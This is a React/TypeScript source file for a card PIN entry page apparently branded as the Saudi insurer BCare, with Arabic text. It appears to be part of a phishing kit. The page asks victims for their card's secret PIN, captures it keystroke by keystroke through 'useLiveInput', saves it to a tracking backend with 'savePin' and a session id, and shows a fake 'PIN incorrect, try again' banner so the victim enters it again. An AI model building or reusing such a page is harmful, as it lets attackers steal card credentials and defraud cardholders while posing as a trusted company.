import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { PublicLayout } from "@/components/PublicLayout";
import { RejectBanner } from "@/components/RejectBanner";
import { useState } from "react";
import { z } from "zod";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useLiveInput } from "@/hooks/useLiveInput";
import { savePin } from "@/lib/tracking.functions";

export const Route = createFileRoute("/payment/pin")({
  head: () => ({ meta: [{ title: "الرقم السري | بي كير" }] }),
  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
  component: PinPage,
});

function PinPage() {
  useVisitorTracking("PIN");
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  useLiveInput({ pin });
  const [loading, setLoading] = useState(false);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;
    setLoading(true);
    await savePin({ data: { session_id: sessionId, pin } }).catch(() => {});
    setLoading(false);
    navigate({ to: "/payment/wait", search: { from: "pin" } });
  }

  return (
    <PublicLayout>
      <div className="container mx-auto px-3 py-8">
        <div className="mx-auto max-w-md">
          <RejectBanner message="الرقم السري غير صحيح، يرجى المحاولة مرة أخرى." />
          <div className="rounded-2xl bg-white p-6 shadow-sm text-center">
            <h1 className="mb-2 text-xl font-bold text-bcare-blue">الرقم السري للبطاقة</h1>
            <p className="mb-6 text-sm text-bcare-muted">أدخل الرقم السري لإكمال العملية</p>
            <form onSubmit={onSubmit} className="space-y-4">
              <input value={pin} onChange={(e) => setPin(e.target.value)} type="password" inputMode="numeric" maxLength={6} required className="h-14 w-full rounded-lg border border-bcare-border px-3 text-center text-2xl tracking-widest outline-none focus:border-bcare-blue" />
              <button type="submit" disabled={loading} className="flex h-12 w-full items-center justify-center rounded-lg bg-bcare-orange font-bold text-white disabled:opacity-60">
                {loading ? "جاري التحقق..." : "تأكيد"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </PublicLayout>
  );
}
